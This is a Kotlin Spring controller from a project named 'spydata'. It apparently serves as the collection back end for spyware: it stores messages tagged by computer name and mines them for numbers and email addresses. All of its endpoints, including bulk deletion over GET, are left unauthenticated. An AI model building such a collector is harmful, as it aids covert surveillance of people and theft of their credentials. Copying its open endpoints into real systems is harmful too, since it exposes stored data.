package com.farvher.spydata.controllers

import org.springframework.stereotype.Controller
import com.farvher.spydata.services.DataService
import org.springframework.ui.Model
import org.springframework.web.bind.annotation.GetMapping
import org.springframework.web.bind.annotation.PathVariable
import org.springframework.web.bind.annotation.PostMapping
import org.springframework.web.bind.annotation.ResponseBody
import org.springframework.web.bind.annotation.RequestParam
import com.farvher.spydata.entity.Data
import java.time.LocalDate


@Controller
class DataController(val dataService : DataService) {
	
	
	
	@PostMapping("/save")
	@ResponseBody
	fun saveData(@RequestParam message : String , @RequestParam computer : String) : String{
		dataService.save(Data(LocalDate.now() ,computer ,message ))
		return "saved"
	}
	
	@GetMapping("/")
	fun home() : String  {
		return "index"
	}
	
	@GetMapping("/rest")
	@ResponseBody
	fun rest() : List<Data> {
		
		return dataService.findAll();
		 
	}
	
	@GetMapping("/data")
	fun data(model : Model) : String  {
		model.addAttribute("data",dataService.findAll())
		return "index"
	}
	
	@PostMapping("/find")
	fun home(model : Model , @RequestParam computer:String) : String  {
		model.addAttribute("data",dataService.findByComputer(computer))
		return "index"
	}
	
	@GetMapping("/delete")
	fun deleteAll() : String {
		dataService.deleteAll()
		return "index"
	}
	
	@GetMapping("/delete/{id}")
	@ResponseBody
	fun deleteById(@PathVariable id : Long) : String {
		dataService.deleteById(id);
		return "deleted "+id
	}
	
	@GetMapping("/delete-computer/{computer}")
	@ResponseBody
	fun deleteByComputer(@PathVariable computer : String) : String {
		dataService.deleteByComputer(computer);
		return "deleted "+computer
	}
	
	@PostMapping("/contains")
	fun findConstains(model : Model , @RequestParam contains : String) : String{
		model.addAttribute("data",dataService.findByContains(contains))
		return "index"	
	}
	
	@GetMapping("/regexNumber")
	fun findRegexNumber(model : Model) : String{
		model.addAttribute("data",dataService.findByMatchNumber())
		return "index"	
	}
	
	@GetMapping("/regexEmail")
	fun findRegexEmail(model : Model) : String{
		model.addAttribute("data",dataService.findByMatchEmail())
		return "index"	
	}
	
}